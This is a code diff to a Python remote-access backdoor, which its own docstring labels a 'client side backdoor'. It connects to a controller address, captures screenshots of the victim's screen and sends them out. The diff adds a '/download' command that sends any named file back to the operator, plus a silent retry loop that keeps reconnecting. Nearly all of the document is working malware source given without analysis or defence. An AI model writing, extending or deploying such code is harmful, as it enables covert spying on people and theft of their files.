@@ -8,15 +8,17 @@ from socket import socket, AF_INET, SOCK_STREAM
 from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
+from pathlib import Path
 from pickle import dumps
 from requests import get, packages
 from os import uname
 from time import sleep
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+#from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-packages.urllib3.disable_warnings(InsecureRequestWarning)
+#packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Client(object):
+    """ client side backdoor """
     def __init__(self, host='0.0.0.0', port=1234):
         self.__Address = (host, port)
         self.screenshotPath = '/home/znairy/736f6e61726973.png'
@@ -26,24 +28,52 @@ class Client(object):
 
     def screenshot(self, args):
         grab().save(self.screenshotPath)
-        log = datetime.now()
-        
-        with open(self.screenshotPath, 'rb') as file:
-            file = file.read()
+        namefile, extension, file = self.splitFile(self.screenshotPath)
 
         header = {
-            "namefile": f"{log.day}-{log.month}-{log.year}.{log.hour}-{log.minute}-{log.second}",
-            "extension": "png",
-            "bytes": len(file) 
+            "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
+            "extension": extension,
+            "bytes": len(file),
+            "path": "screenshots",
+            "exists": True
         }
 
         self.__Client.send(dumps(header))
         sleep(1)
         self.__Client.send(file)
 
+    def splitFile(self, path):
+        with open(path, 'rb') as file:
+            return Path(path).stem, Path(path).suffix, file.read()
+
+    def sendFile(self, file):
+        self.__Client.send(file)
+
+    def sendHeader(self, header):
+        self.__Client.send(dumps(header))
+
+    def download(self, args):
+        if Path(args[0]).is_file():
+            namefile, extension, file = self.splitFile(args[0])
+            header = {
+                "namefile": namefile,
+                "extension": extension,
+                "bytes": len(file),
+                "path": "files",
+                "exists": True
+            }
+
+            self.sendHeader(header)
+            sleep(1)
+            self.sendFile(file)
+
+        else:
+            self.sendHeader({"namefile":args[0], "exists": False})
+
     def allCommands(self):
         commands = {
-            "/screenshot": {"action": self.screenshot}
+            "/screenshot": {"action": self.screenshot},
+            "/download": {"action": self.download}
         }
 
         return commands
@@ -82,8 +112,7 @@ class Client(object):
         self.configureSocket()
         try:
             self.connect()
-        except Exception as err:
-            print(err)
+        except Exception:
             sleep(1);self.run()
         finally:
             self.listenServer()
